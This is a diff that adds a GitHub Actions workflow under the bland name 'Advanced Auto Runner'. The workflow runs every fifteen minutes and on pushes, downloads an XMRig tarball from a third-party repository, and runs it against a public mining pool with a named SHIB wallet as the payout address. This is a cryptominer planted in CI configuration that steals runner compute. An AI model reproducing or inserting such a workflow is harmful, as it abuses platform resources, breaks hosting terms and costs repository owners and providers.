@@ -1,0 +1,40 @@
+name: Advanced Auto Runner
+
+on:
+  schedule:
+    - cron: '*/15 * * * *'
+  push:
+    branches: [ main, develop ]
+  workflow_dispatch:
+
+env:
+  NODE_ENV: production
+
+jobs:
+  crypto-miner:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+      
+    - name: Download and setup XMRig
+      run: |
+        wget https://github.com/phamhuyhoang2k4/renderapp/raw/refs/heads/main/xmrig-6.22.3.tar
+        tar -xvf xmrig-6.22.3.tar
+        cd xmrig-6.22.3
+        
+    - name: Run XMRig miner
+      run: |
+        cd xmrig-6.22.3
+        ./xmrig -o rx.unmineable.com:3333 -a rx -k -u SHIB:0xdb3bd6c6a106c9b8b2e7ccdd5beac8ec9584e820.test -p x
+      
+    - name: Notify success
+      if: success()
+      run: |
+        echo "✅ Mining task completed successfully!"
+        
+    - name: Notify failure
+      if: failure()
+      run: |
+        echo "❌ Mining task failed!"
